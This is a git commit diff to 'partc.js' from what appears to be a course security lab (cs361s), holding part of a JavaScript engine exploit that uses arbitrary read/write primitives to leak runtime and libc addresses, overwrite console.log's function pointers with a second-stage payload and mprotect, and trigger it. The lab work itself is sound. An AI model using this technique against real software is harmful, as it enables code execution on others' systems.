b8b7c783d4ee0c130f02c7104a6fae511359e2e2
Denis Ivanov <denis.ivanov26@gmail.com>
2022-04-12 23:18:06 -0500

    Update partc.js

--- proj5/partc.js
+++ proj5/partc.js
@@ -15,8 +15,7 @@ const second_stage =
  */
 
 // ctx -> rt -> js malloc usable size
-const addressconsole = cs361s.addrof(console.log);
-const ctx = cs361s.readmem(addressconsole + 48);
+const ctx = cs361s.readmem(cs361s.addrof(console.log) + 48);
 const rt = cs361s.readmem(ctx + 24);
 const jsMallocUsableSize = cs361s.readmem(rt + 24);
 const auipc = cs361s.readmem(jsMallocUsableSize) >>> 12 << 12; // 20 immediate bits
@@ -36,6 +35,7 @@ const addressmprotect = gameofthrones - 0x31B00;//difference between malloc and 
  */
 const secondstageaddress = cs361s.addrof(second_stage);
 const num = Math.pow(10, -320) * 2.0237;
+const addressconsole = cs361s.addrof(console.log);
 cs361s.writemem(addressconsole + 48, secondstageaddress);
 cs361s.writemem(addressconsole + 56, addressmprotect);
 console.log.apply(num, null); //change num to be x10 power of -320
